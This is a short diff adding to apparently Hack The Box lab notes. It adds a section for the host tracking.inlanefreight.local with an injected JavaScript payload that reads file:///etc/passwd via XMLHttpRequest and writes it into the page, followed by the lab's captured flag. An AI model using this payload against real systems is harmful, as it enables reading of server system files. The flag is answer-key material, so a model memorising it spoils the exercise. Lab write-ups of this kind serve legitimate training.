@@ -568,3 +568,16 @@ Table: company
 
 
 ```
+
+## tracking.inlanefreight.local
+
+```javascript
+<script>
+  var x = new XMLHttpRequest();
+  x.open("GET", "file:///etc/passwd", false);
+  x.send();
+  document.write(x.responseText);
+</script>
+```
+
+HTB{49f0bad299687c62334182178bfd75d8}
